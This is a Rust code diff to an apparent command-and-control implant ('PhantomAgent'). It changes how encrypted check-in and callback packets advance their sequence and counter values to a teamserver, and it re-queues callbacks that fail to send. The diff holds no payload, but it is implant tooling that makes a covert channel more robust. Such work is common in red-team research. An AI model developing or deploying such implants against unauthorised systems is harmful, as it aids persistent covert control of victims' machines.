@@ -63,9 +63,12 @@ impl PhantomAgent {
             0,
             &[],
         )?;
-        let _response = self.transport.send(&packet).await?;
+        let response = self.transport.send(&packet).await;
+        // Always advance — the teamserver consumes seq/ctr before sending the response.
+        // If the response is lost, not advancing here desynchs every subsequent packet.
         self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandCheckin), 0);
         self.callback_seq += 1;
+        let _response = response?;
 
         // Fetch queued tasks with a separate COMMAND_GET_JOB request.
         let packages = self.get_job().await?;
@@ -87,11 +90,14 @@ impl PhantomAgent {
                     callback.request_id(),
                     &payload,
                 )?;
-                match self.send_packet(packet).await {
+                let send_result = self.send_packet(packet).await;
+                // Always advance — the teamserver consumes seq/ctr before responding.
+                // Conditional advance causes permanent desync when the server received
+                // the packet but the TCP response was lost (red-cell-c2-n4kr4).
+                self.ctr_offset += callback_ctr_blocks(callback.command_id(), payload.len());
+                self.callback_seq += 1;
+                match send_result {
                     Ok(()) => {
-                        self.ctr_offset +=
-                            callback_ctr_blocks(callback.command_id(), payload.len());
-                        self.callback_seq += 1;
                         if matches!(callback, PendingCallback::Exit { .. }) {
                             exit_requested = true;
                         }
@@ -206,22 +212,32 @@ impl PhantomAgent {
         if self.ecdh_session.is_some() {
             return self.ecdh_flush_pending_callbacks().await;
         }
-        for callback in self.state.drain_callbacks() {
-            let payload = callback.payload()?;
+        let callbacks = self.state.drain_callbacks();
+        let mut idx = 0;
+        while idx < callbacks.len() {
+            let payload = callbacks[idx].payload()?;
             let packet = build_callback_packet(
                 self.agent_id,
                 &self.session_crypto,
                 self.ctr_offset,
                 self.callback_seq,
-                callback.command_id(),
-                callback.request_id(),
+                callbacks[idx].command_id(),
+                callbacks[idx].request_id(),
                 &payload,
             )?;
-            self.send_packet(packet).await?;
-            self.ctr_offset += callback_ctr_blocks(callback.command_id(), payload.len());
+            let send_result = self.send_packet(packet).await;
+            // Always advance — the teamserver consumes seq/ctr before responding.
+            // Conditional advance causes permanent desync when the server received
+            // the packet but the TCP response was lost (red-cell-c2-n4kr4).
+            self.ctr_offset += callback_ctr_blocks(callbacks[idx].command_id(), payload.len());
             self.callback_seq += 1;
+            if let Err(e) = send_result {
+                warn!(error = %e, "failed to flush callback; re-queuing remaining");
+                self.state.requeue_callbacks_front(callbacks[idx..].to_vec());
+                return Err(e);
+            }
+            idx += 1;
         }
-
         Ok(())
     }
 }
